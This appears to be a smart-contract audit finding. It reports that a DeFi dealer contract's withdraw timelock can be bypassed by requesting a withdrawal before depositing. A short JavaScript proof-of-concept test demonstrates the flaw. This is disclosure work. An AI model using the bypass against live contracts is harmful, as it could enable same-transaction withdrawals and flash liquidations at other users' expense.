# withdraw timelock can be bypassed

## Summary
The timelock for a withdraw can be bypassed by registering a withdraw before you do your deposit.

## Vulnerability Detail
There is a timelock when doing withdraws so that you cannot withdraw directly after doing a deposit. There is however no check that a user has a deposit when registering a withdraw. A user can thus register a withdraw long before using it. Thus gaining the ability to deposit and withdraw in the same tx.

PoC, add this to `withdraw` in `fund-test.ts`:
```javascript
    it("bypass timelock", async () => {
      await context.dealer.setWithdrawTimeLock("100");
      const state = await context.dealer.state();
      expect(state.withdrawTimeLock).to.equal("100");

      let d = context.dealer.connect(trader1);
      await d.requestWithdraw(
        utils.parseEther("100000"),
        0
      );
      
      await timeJump(101);

      await d.deposit(
        utils.parseEther("100000"),
        0,
        trader1Address
      );
      await d.executeWithdraw(trader1Address, false);

      await checkPrimaryAsset(context, trader1Address, "1000000");
    });
```

## Impact
A user can bypass the withdraw timelock. This can open up unwanted flash liquidations.
